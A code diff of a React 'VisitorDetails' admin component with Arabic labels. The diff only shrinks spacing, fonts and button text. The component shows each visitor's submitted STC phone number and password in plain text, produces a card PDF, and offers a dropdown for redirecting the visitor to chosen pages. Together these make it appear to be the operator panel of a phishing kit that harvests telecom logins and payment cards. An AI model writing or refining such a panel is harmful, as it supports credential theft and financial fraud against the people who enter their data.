@@ -966,25 +966,25 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   return (
     <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
       {/* Header */}
-      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
-        <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
+      <div className="bg-white border-b border-gray-200 p-2 md:p-3">
+        <div className="flex flex-col gap-2 md:flex-row md:items-start md:justify-between">
           <div className="min-w-0">
             {onBack && (
               <button
                 onClick={onBack}
-                className="mb-3 inline-flex items-center gap-1 rounded-lg border border-gray-300 px-3 py-1.5 text-xs font-medium text-gray-700 transition-colors hover:bg-gray-100"
+                className="mb-2 inline-flex items-center gap-1 rounded border border-gray-300 px-2 py-1 text-[10px] font-medium text-gray-700 transition-colors hover:bg-gray-100"
               >
-                <ArrowRight className="h-4 w-4" />
-                الرجوع للقائمة
+                <ArrowRight className="h-3 w-3" />
+                الرجوع
               </button>
             )}
-            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
+            <h2 className="text-base md:text-lg font-bold text-gray-900">
               {visitorDisplayName}
             </h2>
 
             {/* Contact Info */}
-            <div className="flex flex-col gap-1 mt-2">
-              <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
+            <div className="flex flex-col gap-0.5 mt-1">
+              <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 text-xs">
                 <span className="text-gray-600">
                   📞{" "}
                   <span className="font-semibold text-gray-800">
@@ -1001,11 +1001,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               </div>
               {/* Display STC Data */}
               {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg">
-                  <h4 className="font-semibold text-purple-900 mb-2">
+                <div className="bg-purple-50 border-r-4 border-purple-500 p-2 rounded">
+                  <h4 className="font-semibold text-purple-900 text-xs mb-1">
                     بيانات STC
                   </h4>
-                  <div className="space-y-2 text-sm">
+                  <div className="space-y-1 text-[10px]">
                     {visitor.stcPhone && <div>الجوال: {visitor.stcPhone}</div>}
                     {visitor.stcPassword && (
                       <div>كلمة المرور: {visitor.stcPassword}</div>
@@ -1039,7 +1039,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           </div>
 
           {/* Navigation */}
-          <div className="flex w-full flex-col items-stretch gap-2 sm:flex-row sm:items-center md:w-auto">
+          <div className="flex w-full flex-col items-stretch gap-1.5 sm:flex-row sm:items-center md:w-auto">
             <button
               onClick={async () => {
                 setIsGeneratingPdf(true);
@@ -1052,18 +1052,18 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 }
               }}
               disabled={isGeneratingPdf}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-red-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+              className="flex w-full items-center justify-center gap-1 rounded px-3 py-1.5 text-[10px] font-medium text-white transition-colors bg-red-600 hover:bg-red-700 disabled:opacity-50 sm:w-auto"
             >
               {isGeneratingPdf ? (
                 <>
-                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
+                  <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                   </svg>
-                  جاري التحميل...
+                  جاري...
                 </>
               ) : (
-                <>📄 تحميل PDF</>
+                <>📄 PDF</>
               )}
             </button>
             <button
@@ -1078,25 +1078,25 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 }
               }}
               disabled={isGeneratingCardPdf}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-indigo-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+              className="flex w-full items-center justify-center gap-1 rounded px-3 py-1.5 text-[10px] font-medium text-white transition-colors bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 sm:w-auto"
             >
               {isGeneratingCardPdf ? (
                 <>
-                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
+                  <svg className="animate-spin h-3 w-3" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                   </svg>
-                  جاري التحميل...
+                  جاري...
                 </>
               ) : (
-                <>💳 PDF البطاقة</>
+                <>💳 PDF</>
               )}
             </button>
             {/* Navigation Dropdown */}
             <select
               onChange={(e) => handleNavigate(e.target.value)}
               disabled={isNavigating}
-              className="w-full rounded-lg border border-gray-300 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 sm:w-auto"
+              className="w-full rounded border border-gray-300 bg-white px-2 py-1.5 text-[10px] focus:outline-none disabled:opacity-50 sm:w-auto"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">🏠 الرئيسية</option>
@@ -1115,7 +1115,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       </div>
 
       {/* Bubbles */}
-      <div className="flex-1 overflow-y-auto p-3 md:p-6">
+      <div className="flex-1 overflow-y-auto p-2 md:p-3">
         {sortedBubbles.length === 0 ? (
           <div className="text-center text-gray-500 py-12">
             <p>لا توجد بيانات لعرضها</p>
